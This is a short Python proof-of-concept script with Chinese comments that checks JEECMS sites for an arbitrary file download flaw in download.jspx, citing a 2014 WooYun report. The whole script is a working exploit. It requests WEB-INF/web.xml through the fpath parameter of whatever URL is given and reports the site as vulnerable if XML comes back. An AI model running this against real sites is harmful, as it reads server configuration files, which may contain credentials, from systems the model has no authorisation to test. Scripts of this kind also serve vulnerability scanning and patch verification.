#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: jeecms download.jsp 参数fpath任意文件下载
referer: http://www.wooyun.org/bugs/WooYun-2014-77960
author: Lucifer
description: 文件download.jsp中,参数fpath存在任意文件下载。
'''
import sys
import requests
import warnings
def run(url):
        result=['','不存在']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/download.jspx?fpath=WEB-INF/web.xml&filename=WEB-INF/web.xml"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.headers["Content-Type"] == "application/xml":
                result[1]=  '存在'
                result[0] = vulnurl
            else:
                result[1]=  '不存在'

        except:
            result[1]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    